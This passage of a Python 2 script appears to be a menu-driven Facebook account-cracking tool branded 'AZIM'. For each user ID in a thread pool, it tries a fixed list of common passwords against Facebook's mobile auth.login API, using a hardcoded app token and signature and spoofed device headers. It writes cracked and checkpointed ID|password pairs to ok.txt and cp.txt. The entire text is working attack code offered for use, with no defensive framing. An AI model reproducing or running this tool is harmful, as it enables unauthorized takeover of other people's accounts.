[FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
		try:
			pass1 = "102030"
			api = 'https://b-api.facebook.com/method/auth.login'
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			data = requests.get(api, params=params, headers=headers_)
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = "223344"
					api = 'https://b-api.facebook.com/method/auth.login'
					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = "556677"
							api = 'https://b-api.facebook.com/method/auth.login'
							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
							data = requests.get(api, params=params, headers=headers_)
							if "access_token" in data.text and "EAAA" in data.text:
								print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = "786786"
									api = 'https://b-api.facebook.com/method/auth.login'
									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
									data = requests.get(api, params=params, headers=headers_)
									if "access_token" in data.text and "EAAA" in data.text:
										print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = "123456"
											api = 'https://b-api.facebook.com/method/auth.login'
											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = "112233"
													api = 'https://b-api.facebook.com/method/auth.login'
													params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass6, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "123356789"
															api = 'https://b-api.facebook.com/method/auth.login'
															params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass7, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
										
										
		except:
			pass
	p = ThreadPool()
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m THE PROCESS HAS BEEN COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()
    
if __name__ == '__main__':
	main()
